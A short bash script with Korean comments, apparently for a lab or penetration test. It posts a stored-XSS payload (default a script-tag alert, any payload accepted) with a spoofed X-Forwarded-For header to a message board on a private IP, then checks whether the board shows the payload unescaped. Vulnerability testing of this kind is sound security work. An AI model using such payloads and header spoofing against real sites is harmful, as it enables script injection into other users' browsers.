#!/bin/bash
# Stored XSS 테스트 스크립트
# 사용법: ./xss-test.sh [payload]

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"
PAYLOAD="${1:-<script>alert('XSS')</script>}"

echo "[*] Stored XSS 테스트"
echo "[*] 타겟: $TARGET/board"
echo "[*] 페이로드: $PAYLOAD"
echo ""

# XSS 페이로드 게시
curl -s -X POST \
    -H "X-Forwarded-For: $MY_IP" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "content=$PAYLOAD" \
    "$TARGET/board" > /dev/null

echo "[+] 페이로드 전송 완료"
echo ""

# 게시판에서 페이로드 확인
echo "[*] 게시판에서 페이로드 확인:"
curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/board" | grep -o "$PAYLOAD" | head -1

if curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/board" | grep -q "$PAYLOAD"; then
    echo ""
    echo "[+] XSS 취약점 확인됨! 페이로드가 이스케이프 없이 출력됩니다."
else
    echo ""
    echo "[-] 페이로드가 필터링되었거나 이스케이프되었습니다."
fi
